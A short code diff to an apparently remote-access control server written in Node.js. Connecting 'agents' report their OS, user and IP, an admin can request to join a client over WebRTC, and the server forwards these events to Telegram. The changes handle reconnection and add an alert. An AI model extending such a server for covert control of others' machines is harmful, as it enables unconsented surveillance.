@@ -70,7 +70,6 @@ function broadcastLogToAdmins(line) {
 app.use(express.static(__dirname)); 
 
 app.get('/', (req, res) => {
- // Serve the main page (could be a landing page or same as admin)
  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.end(fs.readFileSync(path.join(__dirname, 'admin.html'), 'utf8'));
 });
@@ -114,14 +113,21 @@ wss.on('connection', (ws, req) => {
  }
 
  if (data.type === 'info') {
+ // If this is a reconnection with the same ID, update existing client
+ if (clients[data.id]) {
+ clients[data.id].ws = ws;
+ clients[data.id].lastSeen = Date.now();
+ clients[data.id].info = data;
+ } else {
  clients[id].info = data;
  clients[id].lastSeen = Date.now();
+ }
  notifyAdmin(id, `🟢 New User: ${data.os} (${data.user})`);
  broadcastToAdmin(id, data);
  notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os}\nUser: ${data.user}\nIP: ${data.ip || 'Unknown'}`);
  } 
  else if (data.type === 'heartbeat') {
- clients[id].lastSeen = Date.now();
+ if (clients[id]) clients[id].lastSeen = Date.now();
  } 
  else if (['offer', 'answer', 'candidate'].includes(data.type)) {
  // Forward signaling data to the specific target
@@ -154,6 +160,7 @@ wss.on('connection', (ws, req) => {
  timestamp: Date.now()
  }));
  logToFile(`[ADMIN] Requested join to ${targetId}`);
+ notifyTelegram(`🔗 ADMIN REQUESTED JOIN FROM ${targetId}`);
  }
  }
  else {
